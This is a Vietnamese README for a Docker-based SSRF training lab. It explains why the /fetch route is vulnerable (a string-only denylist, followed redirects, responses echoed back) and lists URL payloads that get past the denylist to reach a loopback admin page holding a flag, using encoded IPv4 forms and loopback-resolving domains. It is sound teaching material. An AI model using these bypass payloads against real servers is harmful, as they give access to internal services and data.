# SSRF Lab

> **Mục tiêu**: Thực hành tấn công SSRF (Server-Side Request Forgery) qua một chức năng "server tải nội dung từ URL".

## 1) Cách chạy
```bash
# Trong thư mục ssrf-lab/
docker compose up --build
# Mở trình duyệt: http://localhost:5002
```

Biến môi trường `FLAG` được set trong `docker-compose.yml`.

---

## 2) Lỗ hổng ở đâu?
Trong `app/app.py`, route `/fetch` lấy tham số `?url=` và **server** dùng `requests.get()` để đi lấy tài nguyên bên ngoài:

- Không kiểm tra IP đích thực sự (không resolve DNS/không so subnet),
- Dùng **denylist** chỉ dò chuỗi (`localhost`, `127.0.0.1`, `::1`, ...),
- Cho phép `allow_redirects=True` (có thể bị chuyển hướng vào mạng nội bộ),
- Trả **nguyên văn** nội dung phản hồi cho người dùng.

=> Kẻ tấn công có thể buộc server kết nối đến **dịch vụ nội bộ** hoặc **chính bản thân server** (loopback) để đọc dữ liệu nhạy cảm.

---

## 3) Payload khai thác
### Đọc nội dung admin nội bộ (chứa FLAG)
**Mục tiêu nội bộ**: `http://127.0.0.1:5002/admin` — nhưng chuỗi này bị denylist.

Bypass các cách biểu diễn **không chứa** chuỗi bị chặn:

- IPv4 decimal (DWORD):
    ```
    http://2130706433:5002/admin
    ```
    2130706433 = 127.0.0.1 (0x7f000001).
- Pv4 single hex (DWORD hex)
    ```
    http://0x7f000001:5002/admin
    ```

- IPv4 mixed (hex + thập phân)
    ```
    http://0x7f.1:5002/admin
    ```
    
- IPv4 dotted hex
    ```
    http://0x7f.0x0.0x0.0x1:5002/admin
    ```
    Nhiều stack chấp nhận hex cho từng octet.

- IPv4 shorthand (rút gọn octet — đa số OS/lib mở rộng thành `127.0.0.1`)
    ```
    http://127.1:5002/admin
    ```

- Tên miền trỏ sẵn về loopback (không chứa `127.0.0.1`)
    ```
    http://localtest.me:5002/admin
    ```
    `localtest.me` mặc định resolve `127.0.0.1`.

- Tên miền phụ của localtest (vẫn về loopback)
    ```
    http://foo.localtest.me:5002/admin
    ```

- Wildcard DNS về loopback (biểu diễn dấu gạch)
    ```
    http://127-0-0-1.sslip.io:5002/admin
    ```
    `sslip.io` map `127-0-0-1` → 127.0.0.1 (không có chuỗi `127.0.0.1` trong URL).

---

